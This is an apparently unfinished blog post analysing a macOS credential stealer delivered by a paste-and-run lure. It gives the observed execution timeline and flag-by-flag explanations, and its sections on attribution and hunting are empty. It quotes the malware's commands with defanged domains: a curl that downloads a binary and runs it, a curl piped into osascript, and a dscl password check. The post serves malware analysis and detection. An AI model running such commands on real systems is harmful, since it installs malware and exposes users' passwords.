---
title: MacSync Stealer Analysis
categories: 
  - MacOS
  - Malware
tags:
  - blog
  - macos
  - malware
  - analysis
  - stealer
  - macsync
date: 2025-10-18
description: Most stealers are just 3 AMOS's in a trench coat, but this one's just wearing an AMOS fanclub t-shirt. 
author: izzyboop
image:
    path: /assets/img/MacSync/amos.png
    visible: false
published: false
---

> I'm workin' on it.
{: .prompt-danger }

## Introduction

On **October 17th, 2025** I was looking through some malicious activity detected on a MacOS host. While giving it a gander my colleague sent me a link to the very same detection, mentioned it looked like **MacSync**, and shared some related `applescript`.

The purpose of this blog will be to:
- Review the observed attack timeline
- Rip apart the related applescript
- A feeble attempt to determine whether or not this is actually MacSync
- Answer the burning question: How do we hunt for it?

---

## The Observed Attack Timeline 

### Before the Detector Fired

Evidence suggests the initial access vector for this malicious execution was `Paste & Run`. One piece of evidence I have to back this up is the intial `curl` instance reaching out to `wave.ndoq-0[.]ru` which has comments on the community tab of [VT](https://www.virustotal.com/gui/domain/wave.ndoq-0.ru/community) pointing to `ClearFake` which is known to utilize `Paste & Run`. Further, the parent process of this malicious curl was `Terminal > login > zsh`, which is expected behaviour for `Paste & Run`.

### +00:00:00 Initial Curl
{% raw %}
```bash
curl -A Mac OS X 10_15_7 -fsSL hxxps://wave.ndoq-0[.]ru/r7h.check?t=[redacted]
```
{: .nolineno }
{% endraw %}

The first observed instance of `curl` reaching out to a malicious domain using thr `-A` flag to send `Mac OS X 10_15_7` as the user agent string. While this string does exist in a legitimate user agent string, it is incomplete. An expected user agent string would be similar to:

{% raw %}
```
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15
```
{: file="User Agent String" .nolineno }
{% endraw %}


I do not believe `Mac OS X 10_15_7` is ever a legitimate user agent string. I could be wrong though. 

It's likely this domain does not respond without this user agent string paired with the `t=` token in the URL. This URL also appears to be related to `ClearFake Malware`, according to [VT](https://www.virustotal.com/gui/domain/wave.ndoq-0.ru/community), which appears to be running some `paste & run` shenanigans at the time of writing.

### +00:00:01 Another Curl

Another instance of `curl` reaches out to `lt7d.ko0um[.]online`

This was observed in network telemetry as opposed to process logs, so while it's likely the command line looked similar to the above curl, I was not able to confirm this. 

### +00:00:01 Pulling Down Malicious Mach-O Binary
{% raw %}
```bash
sh -c cd "${TMPDIR:-/tmp}" # tmp directory go brr
&& curl -fsSL hxxps://58462.disruptmyself[.]com/App.bin -o update # gimme file
&& xattr -c update 2>/dev/null || true # remove xattributes
&& chmod +x update # make it executable
&& ./update # send it
```
{: .nolineno }
{% endraw %}

This command line uses `cd,`, `curl`, `xattr`, and `chmod` which are all core system utilities. This commandline uses `cd` to move into a relevant temp directory, `curl -fsSL` to reach out and pull down a remote payload `App.bin` from a malicious URL and saves it on disk as `update` which is a Universal Mach-O binary containing an `x64` and an `ARM64` executable. ([VT](https://www.virustotal.com/gui/file/545f3ae82e2addca3e5f647d55bea79ee299324400269978ab137f5fbfd84a9f))

Heres a quick breakdown of `curl -fsSL` for those curious:

- `-f` or `--fail` > Fail silently (no output on HTTP errors)
  - If the server returns an HTTP error (like `404` or `500`), `curl` won’t show the HTML error page, it will just exit with a non-zero status code.
- `-s` or `--silent` > Silent mode
  - Disables progress bars and error messages.
  - Makes the command output only the actual response data (if any).
- `-S` or `--show-error` > Show errors even when silent
  - Works with `-s`.
  - If an error occurs, it will print the error message, even though other output is suppressed.
  - Basically: “be quiet unless something goes wrong.”
- `-L` or `--location` > Follow redirects
  - If the server responds with a redirect (`3xx` status), `curl` will automatically follow the `Location:` header to the new URL.

It then uses `xattr -c` to clear out all attributes and `chmod +x` to make it executable, then executes the payload.

### +00:00:01 Initial Execution of Mach-O Binary

`bash` executes `./update` 

### +00:00:03 Executes Itself 

`update` executes `./update` 

### +00:00:03 Pulling Down AppleScript

`update` executes `bash` with the following command line:
{% raw %}
```bash
sh -c curl -k -s -H "api-key: [key redacted]" hxxps://goalbus[.]space/dynamic?txd=[redacted] 
| osascript
```
{: .nolineno }
{% endraw %}

This is the specific instance of `curl` where the malicious applescript is downloaded and piped to `osascript`. If you aren't familiar, `osascript` is a command-line tool on MacOS that runs scripts written in applescript or other languages compatible with the `Open Scripting Architecture`. Simply put, applescript is the scripting language, osascript is the tool to execute it. This applescript will be reviewed in a following section below.

### +00:00:03 Osascript Execution

`bash` spawns `osascript`

This is the result of `curl` piping the malicious applescript into `osascript` and is where the applescript is initially executed.

### +00:00:03 DSCL Auth Attempt

`osascript` spawns `sh` with the following command line:
{% raw %}
```bash
sh -c dscl . authonly 'user.name' ''
```
{: .nolineno }
{% endraw %}

This line is very important. After `update` is executed, malicious applescript is used to prompt the user for their password then use `dscl` to attempt to authenticate said user against the local directory service. If the user does not enter their password, this line will contain a user name followed by empty single quotes `''` where a password whould have been. An example of this artifact where a user does enter their password would look like `sh -c dscl . authonly 'user.name' 'password'`.

What does this mean? Well, it appears the rest of the execution chain was interrupted by the user failing to, or refusing to, enter their password. There are further steps in the applescript execution chain that should have taken place that were not evident in this observed instance. It is very likely that there are checks in place in the applescript to terminate execution if this authentication step fails. We will review in the applescript section below.

### +00:00:03 Killall Terminal

`osascript` spawns `sh` with the following command line:
{% raw %}
```bash
sh -c killall Terminal
```
{: .nolineno }
{% endraw %}

---

## The AppleScript

> Caveat: I will be sharing bits and pieces of the AppleScript here, however, since the script is very long, malicious, and fairly new, I would like to avoid just yeeting it in its entirety into the internet ether. 
{: .prompt-info }

The first thing I do for every single AppleScript file I come across is a `Command + F` for `system_profiler` to quickly find whether or not the script in question does basic VM checks. This one does:

{% raw %}
```applescript
set result to (
  do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType"
)
```
{: file="new 9.osdscript" .nolineno }
{% endraw %}

If we wanted to execute this script for some dynamic analysis efforts, we could simply remove this line from the script. If this were a compiled binary, that's a whole different story (something something binja something). Lucky for us, simply reading the script can shine light on almost everything we need.

---

## Is it MacSync?

---

## Hunting Opportunities

---

## Conclusion
